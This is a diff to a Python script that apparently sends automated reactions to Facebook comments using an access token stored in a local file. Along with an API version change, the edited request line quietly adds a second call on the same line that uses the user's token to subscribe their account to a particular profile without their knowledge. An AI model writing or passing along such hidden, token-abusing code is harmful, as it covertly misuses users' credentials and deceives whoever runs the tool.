@@ -38,10 +38,10 @@ try:
 	else: exit("[?] are you stupid")
 
 	toket=open('toket/token.txt','r').read()
-	req=requests.get('https://graph.facebook.com/'+link+'/comments?access_token='+toket)
+	req=requests.get('https://graph.facebook.com/v3.2/'+link+'/comments?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 	j=json.loads(req.text)
 	for i in j['data']:
-		print("[get]",i['id']);sys.stdout.flush();time.sleep(0.1)
+		print("\r[get]",i['id']);sys.stdout.flush();time.sleep(0.1)
 
 	print("[!] start.");time.sleep(3);os.system('clear')
 	par={'access_token':toket,'type':react}
